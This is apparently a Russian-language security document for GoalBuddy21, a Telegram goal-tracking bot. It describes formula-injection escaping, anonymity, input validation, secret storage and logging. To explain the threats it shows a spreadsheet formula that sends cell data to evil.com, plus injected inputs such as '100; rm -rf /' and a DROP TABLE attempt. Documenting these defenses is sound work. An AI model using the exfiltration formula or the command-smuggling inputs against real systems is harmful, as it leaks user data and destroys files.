# 🔐 Документация по безопасности GoalBuddy21

## Обзор

Этот документ описывает меры безопасности, реализованные в проекте GoalBuddy21 для защиты от распространенных уязвимостей и обеспечения конфиденциальности пользователей.

---

## 1. ЗАЩИТА ОТ CSV/FORMULA INJECTION

### 1.1 Описание угрозы

**Уязвимость**: При сохранении пользовательского ввода в Google Sheets, текст, начинающийся с специальных символов (`=`, `+`, `-`, `@`), может быть интерпретирован как формула.

**Последствия**:
- **Выполнение формул**: Функции типа `=IMPORTXML()`, `=IMPORTDATA()` могут обращаться к внешним ресурсам
- **Утечка данных**: Возможна передача данных на сторонние серверы
- **CSV Export риски**: При экспорте в CSV/Excel формулы могут выполниться на компьютере аналитика

**Пример атаки**:
```
Цель: =IMPORTXML(CONCAT("http://evil.com/?data=",A1),"//a")
```

### 1.2 Реализованная защита

**Функция**: `escape_for_sheets()` в `utils/validators.py`

**Механизмы защиты**:

1. **Удаление управляющих символов**
   - Удаляются все ASCII символы < 0x20 (кроме `\t` и `\n`)
   - Предотвращает инъекцию контрольных последовательностей

2. **Экранирование опасных символов**
   - Если строка начинается с `=`, `+`, `-`, `@` — добавляется префикс `'` (одинарная кавычка)
   - Google Sheets интерпретирует такие строки как текст, а не формулу

**Пример работы**:
```python
from utils.validators import escape_for_sheets

# Опасный ввод → безопасный вывод
escape_for_sheets("=SUM(A1:A10)")           # → "'=SUM(A1:A10)"
escape_for_sheets("+1234567890")             # → "'+1234567890"
escape_for_sheets("Normal goal text")        # → "Normal goal text"
escape_for_sheets("@IMPORTXML(...)")         # → "'@IMPORTXML(...)"
```

**Применение**:
- ✅ `database/sheets.py::save_user_goal()` — автоматически экранирует все цели перед сохранением
- ✅ Применяется ко всем пользовательским данным, записываемым в Google Sheets

### 1.3 Дополнительные рекомендации

Для фасилитаторов, работающих с данными:

1. **При экспорте в CSV/Excel**:
   - Использовать настройки "Import as text" для столбца с целями
   - Отключить автоматическое выполнение формул в настройках безопасности

2. **Политика безопасности**:
   - Не открывать экспортированные файлы с включенными макросами
   - Использовать "Protected View" в Excel

---

## 2. АНОНИМНОСТЬ ПОЛЬЗОВАТЕЛЕЙ

### 2.1 Требование конфиденциальности

**Политика**: Согласно ТЗ (п. 1.2, 5.3), бот должен обеспечивать **полную анонимность** участников интенсива.

**Запрещено сохранять**:
- ❌ Telegram ID (`user.id`)
- ❌ Username (`@username`)
- ❌ Имя пользователя (`first_name`, `last_name`)
- ❌ Номер телефона
- ❌ Любые другие идентификаторы

**Разрешено сохранять**:
- ✅ Текст цели (анонимный)
- ✅ Дата постановки цели
- ✅ Оценка прогресса (0-100%)
- ✅ Дата оценки

### 2.2 Реализованная защита в БД

**Google Sheets структура** (`UserData`):

| Столбец | Данные | Анонимность |
|---------|--------|-------------|
| A: goal_text | Текст цели | ✅ Анонимно |
| B: goal_date | Дата цели | ✅ Без привязки к пользователю |
| C: final_percent | Оценка (0-100) | ✅ Анонимно |
| D: final_date | Дата оценки | ✅ Без привязки к пользователю |

**Невозможность деанонимизации**:
- Нет никаких полей, связывающих строку с конкретным пользователем Telegram
- Если пользователь ставит 2 цели через `/start` — создаются 2 независимые анонимные записи

### 2.3 Защита в логах

**Проблема**: Логирование `user_id` или `username` нарушает анонимность и создает риск утечки.

**Функция**: `safe_log_snippet()` в `utils/validators.py`

**Механизмы защиты**:

1. **Не логируем идентификаторы**
   - Все логи пишутся БЕЗ `user_id`, `username`
   - Вместо "User 123456789 (john_doe) started" → "User initiated /start command"

2. **Санитизация пользовательского ввода**
   - Удаление `\n`, `\r` (защита от log injection)
   - Удаление управляющих символов
   - Ограничение длины (200 символов)

**Примеры безопасного логирования**:

```python
from utils.validators import safe_log_snippet

# ❌ ПЛОХО (раскрывает user_id)
logger.info(f"User {user_id} saved goal: {goal_text}")

# ✅ ХОРОШО (анонимно + санитизация)
logger.info(f"Saved goal to row {row_number}: {safe_log_snippet(goal_text)}")
```

**Применение в коде**:
- ✅ `bot/handlers.py::start_command()` — не логирует `user_id`
- ✅ `bot/handlers.py::assess_command()` — не логирует `user_id`
- ✅ `bot/handlers.py::handle_text_message()` — использует `safe_log_snippet()`

### 2.4 In-Memory состояния

**Хранилище**: `user_states` словарь в `bot/handlers.py`

```python
user_states = {
    user_id: {
        'state': UserState,
        'row_number': int,
        'goal_text': str
    }
}
```

**Особенности**:
- ✅ Хранится только в оперативной памяти
- ✅ При перезапуске бота — полностью очищается
- ✅ Не сохраняется в логи или файлы
- ✅ `user_id` используется только как ключ для сессии, не сохраняется в БД

---

## 3. ВАЛИДАЦИЯ ПОЛЬЗОВАТЕЛЬСКОГО ВВОДА

### 3.1 Строгая валидация оценки (0-100)

**Проблема**: Небрежная валидация может принять некорректный ввод типа:
- `"100\n"` (с символом новой строки)
- `"100; DROP TABLE users"` (SQL injection попытка)
- `"-5"` (отрицательное число)
- `"1e2"` (научная нотация)

**Функция**: `validate_assessment_score()` в `utils/validators.py`

**Механизм**:

```python
import re

INT_RE = re.compile(r'^\s*(0|[1-9]\d?|100)\s*$')

def validate_assessment_score(text: str) -> Tuple[bool, int]:
    m = INT_RE.match(text)
    if not m:
        return False, -1
    
    score = int(m.group(1))
    if 0 <= score <= 100:
        return True, score
    
    return False, -1
```

**Что принимается**:
- ✅ `"0"`, `"1"`, `"99"`, `"100"`
- ✅ `" 85 "` (с пробелами по краям)
- ✅ `"42"`

**Что отклоняется**:
- ❌ `"-5"` (отрицательное)
- ❌ `"101"` (вне диапазона)
- ❌ `"100\n"` (управляющие символы)
- ❌ `"100; rm -rf /"` (инъекция)
- ❌ `"1e2"` (научная нотация)
- ❌ `"abc"` (не число)

### 3.2 Валидация текста цели

**Функция**: `validate_goal_text()` в `utils/validators.py`

**Механизм**:
```python
def validate_goal_text(text: str, min_length: int = 10, max_length: int = 500) -> Tuple[bool, str]:
    text = text.strip()
    
    if len(text) < min_length:
        return False, f"Цель слишком короткая"
    
    if len(text) > max_length:
        return False, f"Цель слишком длинная"
    
    return True, ""
```

**Ограничения**:
- Минимум: 10 символов (предотвращает мусор)
- Максимум: 500 символов (защита от флуда)

---

## 4. ЗАЩИТА КОНФИДЕНЦИАЛЬНЫХ ДАННЫХ

### 4.1 Переменные окружения

**Правило**: Все токены и ключи хранятся ТОЛЬКО в переменных окружения.

**Защищенные данные**:
```env
BOT_TOKEN=...                  # Telegram Bot Token
SPREADSHEET_ID=...             # Google Sheets ID
GOOGLE_CREDENTIALS=...         # Service Account JSON (Railway)
```

**Запрещено**:
- ❌ Хардкод токенов в коде
- ❌ Коммит `.env` в Git
- ❌ Коммит `credentials/google_credentials.json` в Git

**Защита в репозитории**:

`.gitignore`:
```gitignore
.env
credentials/
logs/
*.log
```

### 4.2 Google Service Account

**Принцип наименьших привилегий**:

1. **Service Account** вместо OAuth
   - Не требует интерактивной авторизации
   - Токены не истекают
   - Подходит для серверных приложений

2. **Минимальные права**:
   - Доступ ТОЛЬКО к одной конкретной таблице (по SPREADSHEET_ID)
   - Права: "Editor" на таблицу (необходимы для append/update)
   - НЕТ доступа к другим Google Drive файлам

3. **Безопасное хранение**:
   - Локально: `credentials/google_credentials.json` (в `.gitignore`)
   - Railway: переменная окружения `GOOGLE_CREDENTIALS` (JSON в одну строку)

### 4.3 Логи

**Правило**: Логи НЕ должны содержать чувствительных данных.

**Что НЕ логируем**:
- ❌ Telegram user_id, username
- ❌ Токены API
- ❌ Полные тексты целей (только sanitized snippet)
- ❌ Google credentials

**Что логируем**:
- ✅ Команды пользователей (без идентификаторов)
- ✅ Номера строк в Google Sheets
- ✅ Проценты оценок
- ✅ Ошибки (без токенов в stack trace)

**Ротация логов**:
- Локально: `logs/bot.log` (вручную очищать периодически)
- Railway: автоматическое хранение последних 7 дней

---

## 5. ДОПОЛНИТЕЛЬНЫЕ МЕРЫ БЕЗОПАСНОСТИ

### 5.1 Rate Limiting для Google Sheets API

**Механизм**: `_retry_on_rate_limit()` в `database/sheets.py`

**Защита от**:
- Превышение лимитов Google API (300 req/min)
- Временные сбои сети

**Реализация**:
```python
def _retry_on_rate_limit(self, func, *args, **kwargs):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            return func(*args, **kwargs)
        except gspread.exceptions.APIError as e:
            if "RATE_LIMIT_EXCEEDED" in str(e):
                wait_time = 2 ** attempt  # Exponential backoff
                time.sleep(wait_time)
            else:
                raise
```

### 5.2 Обработка ошибок

**Глобальный error handler**: `bot/handlers.py::error_handler()`

**Механизм**:
- Ловит все необработанные исключения
- Логирует ошибку (без раскрытия чувствительных данных)
- Отправляет пользователю общее сообщение: "Произошла ошибка"
- НЕ раскрывает внутреннюю структуру кода в сообщениях

### 5.3 Docker Security

**Dockerfile** (безопасные практики):

1. **Non-root user** (рекомендация для будущего):
   ```dockerfile
   RUN useradd -m -u 1000 botuser
   USER botuser
   ```

2. **Минимальный базовый образ**:
   ```dockerfile
   FROM python:3.13-slim
   ```

3. **Отключение кэша pip**:
   ```dockerfile
   ENV PIP_NO_CACHE_DIR=1
   ```

4. **Очистка apt кэша**:
   ```dockerfile
   RUN apt-get update && ... && rm -rf /var/lib/apt/lists/*
   ```

---

## 6. РЕКОМЕНДАЦИИ ПО ЭКСПЛУАТАЦИИ

### 6.1 Для администраторов

**Периодический аудит**:
- [ ] Проверка логов на предмет подозрительной активности
- [ ] Проверка, что `.env` не попал в Git
- [ ] Проверка прав доступа к Google Sheets (только необходимые люди)

**Инцидент-менеджмент**:
1. При утечке `BOT_TOKEN`:
   - Немедленно revoke токен через @BotFather
   - Создать новый токен
   - Обновить переменную окружения

2. При утечке Google Credentials:
   - Удалить Service Account в Google Cloud Console
   - Создать новый Service Account
   - Обновить credentials

### 6.2 Для разработчиков

**Checklist перед коммитом**:
- [ ] Нет хардкода токенов в коде
- [ ] Все пользовательские данные экранированы (`escape_for_sheets`)
- [ ] Логи не содержат `user_id` или `username`
- [ ] Валидация всех пользовательских вводов
- [ ] `.env` и `credentials/` в `.gitignore`

**Code Review фокус**:
- Любое использование `sheet.append_row()` или `sheet.update()` → должно использовать `escape_for_sheets()`
- Любое логирование пользовательских данных → должно использовать `safe_log_snippet()`
- Любая валидация числового ввода → должна использовать strict regex

---

## 7. ИЗВЕСТНЫЕ ОГРАНИЧЕНИЯ

### 7.1 In-Memory состояния

**Ограничение**: `user_states` словарь хранится только в памяти.

**Последствия**:
- При перезапуске бота все состояния теряются
- Пользователи должны повторить `/start`

**Не является уязвимостью**, т.к.:
- Данные в Google Sheets сохранены
- Нет риска утечки (при перезапуске память очищается)

### 7.2 Google Sheets как БД

**Ограничение**: Google Sheets не является полноценной защищенной СУБД.

**Риски**:
- Любой с доступом "Editor" может изменить/удалить данные
- Нет транзакций
- Нет row-level security

**Митигация**:
- Минимизировать количество людей с доступом "Editor"
- Использовать "Viewer" права для аналитиков
- Регулярные бэкапы таблицы (Google Sheets → File → Make a copy)

---

## 8. КОНТРОЛЬНЫЙ СПИСОК БЕЗОПАСНОСТИ

### Реализовано ✅

- [x] CSV/Formula injection защита (`escape_for_sheets`)
- [x] Анонимность пользователей (не сохраняем ID/username в БД)
- [x] Безопасное логирование (не логируем ID/username)
- [x] Санитизация логов (`safe_log_snippet`)
- [x] Строгая валидация оценки (regex `^\s*(0|[1-9]\d?|100)\s*$`)
- [x] Валидация длины текста цели (10-500 символов)
- [x] Токены только в переменных окружения
- [x] `.gitignore` для `.env` и `credentials/`
- [x] Rate limiting для Google Sheets API
- [x] Глобальный error handler
- [x] Экранирование всех данных перед записью в Google Sheets

### Рекомендуется (для будущего)

- [ ] Переход на PostgreSQL для персистентности и лучшей безопасности
- [ ] Шифрование логов (если будет логирование чувствительных данных)
- [ ] Redis для хранения состояний (вместо in-memory)
- [ ] Docker non-root user
- [ ] Автоматическая ротация логов
- [ ] HTTPS webhook вместо long polling (для Railway)
- [ ] Rate limiting на уровне бота (защита от флуда)

---

## 9. ОТЧЕТ О ПРОБЛЕМЕ

Если вы обнаружили уязвимость безопасности:

1. **НЕ создавайте публичный Issue на GitHub**
2. Свяжитесь с maintainers напрямую
3. Опишите:
   - Суть уязвимости
   - Шаги воспроизведения
   - Возможное влияние
   - Предлагаемое решение (опционально)

**Контакт**: (указать актуальный контакт команды)

---

## 10. ИСТОРИЯ ИЗМЕНЕНИЙ

| Дата | Версия | Изменения |
|------|--------|-----------|
| 2025-11-13 | 1.0 | Первая версия документа безопасности |
| 2025-11-13 | 1.1 | Добавлены меры против CSV injection, log injection, strict validation |

---

**Статус документа**: Актуальный  
**Последнее обновление**: 2025-11-13  
**Версия GoalBuddy21**: 1.1.0 (Security Hardened)

